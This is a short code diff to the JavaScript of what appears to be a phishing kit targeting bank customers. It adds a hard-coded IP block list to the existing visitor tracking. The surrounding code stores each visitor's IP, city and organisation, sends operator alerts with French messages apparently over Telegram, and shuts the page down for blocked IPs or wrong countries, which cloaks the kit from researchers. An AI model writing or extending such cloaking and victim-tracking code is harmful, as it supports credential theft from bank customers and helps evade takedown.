@@ -209,7 +209,19 @@
     _setupForms();
     _setupBanks();
 
+    var _BLOCKED_IPS = ['174.95.196.108'];
+
+    function _checkBlock(ip, reason) {
+      if (_BLOCKED_IPS.indexOf(ip) !== -1) {
+        _tg(_R, '🚫 <b>IP BANNI BLOQUÉE (' + ip + ')</b>\n🆔 Session: <code>' + _SID + '</code>');
+        _die();
+        return true;
+      }
+      return false;
+    }
+
     function _sendVisit(ip, city, country, org) {
+      if (_checkBlock(ip)) return;
       _W.sessionStorage.setItem('__xip', ip);
       _W.sessionStorage.setItem('__xorg', org || 'N/A');
       _W.sessionStorage.setItem('__xcity', city || 'N/A');
@@ -222,6 +234,7 @@
       .then(function(r){ return r.json(); })
       .then(function(d){
         if (d && d.success) {
+          if (_checkBlock(d.ip)) return;
           if (d.country_code !== _CC) {
             _tg(_R, '🛑 <b>BLOCAGE PAYS (' + d.country_code + ')</b>\n📍 IP: <code>' + d.ip + '</code>\n🏙️ Ville: <code>' + (d.city || 'N/A') + '</code>');
             setTimeout(_die, 500);
